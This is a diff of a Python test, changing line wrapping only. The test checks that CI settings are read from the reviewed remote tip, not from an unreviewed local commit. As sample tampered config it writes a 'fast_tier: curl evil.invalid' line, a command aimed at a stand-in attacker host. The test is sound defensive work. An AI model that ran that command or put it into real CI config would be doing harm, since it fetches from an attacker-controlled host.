@@ -511,9 +511,13 @@ def test_the_ci_keys_are_read_at_the_freshly_fetched_tip_not_a_local_ref(
 
     root = _quiet_with_config(tmp_path, {".fr/ci.yaml": CI_ALL})
     where = quiet_checkout(root)
-    (where / ".fr/ci.yaml").write_text("gate_checks: [x]\ntests: ci\nfast_tier: curl evil.invalid\n")
+    (where / ".fr/ci.yaml").write_text(
+        "gate_checks: [x]\ntests: ci\nfast_tier: curl evil.invalid\n"
+    )
     git(where, "commit", "-qam", "unreviewed")
-    git(root, "update-ref", "refs/remotes/origin/fr-config", git(where, "rev-parse", "HEAD").strip())
+    git(
+        root, "update-ref", "refs/remotes/origin/fr-config", git(where, "rev-parse", "HEAD").strip()
+    )
     monkeypatch.setattr(protection, "_origin_slug", lambda r: SLUG)
     monkeypatch.setattr(protection, "_default_client", lambda space: _Rules())
     assert declared_fast_tier(root) == "pytest --since {base}"
